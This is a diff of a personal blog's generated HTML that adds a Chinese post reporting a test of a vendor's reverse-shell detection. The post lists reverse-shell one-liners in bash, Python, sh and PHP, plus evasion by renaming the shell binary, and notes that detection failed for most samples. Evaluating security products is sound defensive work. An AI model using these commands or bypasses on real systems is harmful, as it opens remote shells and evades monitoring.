@@ -177,12 +177,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">13</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -219,6 +219,112 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-04-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-03-04-%E6%9F%90%E5%8E%82%E5%95%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E9%98%B2%E6%8A%A4%E8%83%BD%E5%8A%9B%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">某厂商的反弹shell防护能力测试</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-03-04 21:49:41 / 修改时间：21:58:06" itemprop="dateCreated datePublished" datetime="2021-03-04T21:49:41+08:00">2021-03-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>工作任务需要测试某厂商的反弹shell检测安全能力</p>
+<p>测试思路：</p>
+<ol>
+<li>挑选测试样本<ul>
+<li>每一种检测策略挑选对应的1-3个样本</li>
+</ul>
+</li>
+<li>测试过程中<ul>
+<li>如果某一类样本中的任意一个样本未通过测试，就不继续测试同类其他样本</li>
+<li>如果某一类样本完全被拦截，就尝试绕过</li>
+</ul>
+</li>
+</ol>
+<p>测试时需要注意下面的点，可能会影响测试结果</p>
+<ul>
+<li>反弹shell后，是否输入命令</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="挑选测试样本"><a href="#挑选测试样本" class="headerlink" title="挑选测试样本"></a>挑选测试样本</h2><p>按照<code>安全项目/HIDS/业务：入侵检测/反弹shell/3.反弹shell检测.md</code>学习的检测策略，每一种检测策略挑选对应的1-3个样本。</p>
+<ol>
+<li><p>bash进程、默认文件描述符指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>没有bash进程、默认文件描述符不指向socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;127.0.0.1&#39;,2222))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE,shell&#x3D;True);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（使用其他sh解释器）</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对抗行为（修改sh解释器名称）</p>
+<p>   修改bash、sh</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;bin&#x2F;x; x -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1      &#x2F;&#x2F; x是bash</span><br><span class="line"></span><br><span class="line">cp &#x2F;usr&#x2F;bin&#x2F;sh &#x2F;usr&#x2F;bin&#x2F;y; 0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;4242; y &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196  &#x2F;&#x2F; y是sh</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>1 通过</p>
+<p>2、3、4 不通过</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  4类样本中，仅检测出1类最基础的反弹shell。</p>
+<p>  在测试过程中发现：</p>
+<ul>
+<li>检测到反弹shell后不会立马告警：厂商会检测shell是否执行命令，如果仅仅反弹shell但是没有执行命令就不会被拦截</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Reverse Shell Cheat Sheet</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263684.html">云上威胁检测 | 详解反弹shell多维检测技术</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
